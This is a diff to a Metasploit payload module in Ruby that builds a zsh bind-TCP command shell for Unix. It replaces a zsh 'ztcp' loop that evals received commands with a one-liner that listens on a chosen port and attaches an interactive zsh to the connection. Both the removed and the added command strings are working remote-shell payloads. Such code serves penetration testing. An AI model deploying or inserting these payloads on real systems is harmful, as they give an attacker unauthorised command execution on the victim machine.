@@ -1,14 +1,15 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit4
+module MetasploitModule
+
+  CachedSize = 99
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -22,7 +23,8 @@ module Metasploit4
       },
       'Author'        =>
         [
-          'Doug Prostko <dougtko[at]gmail.com>'
+          'Doug Prostko <dougtko[at]gmail.com>',    # Initial payload
+          'Wang Yihang <wangyihanger[at]gmail.com>' # Simplified redirections
         ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'unix',
@@ -43,18 +45,13 @@ module Metasploit4
   # Constructs the payload
   #
   def generate
-    return super + command_string
+    super + command_string
   end
 
   #
   # Returns the command string to use for execution
   #
   def command_string
-    cmd = "zmodload zsh/net/tcp;"
-    cmd << "ztcp -l #{datastore['LPORT']};"
-    cmd << "ztcp -a $REPLY;"
-    cmd << "while read -r cmd <&$REPLY;do eval ${cmd} >&$REPLY;done;"
-    cmd << "ztcp -c"
-    cmd
+    "zsh -c 'zmodload zsh/net/tcp && ztcp -l #{datastore['LPORT']} && ztcp -a $REPLY && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
   end
 end
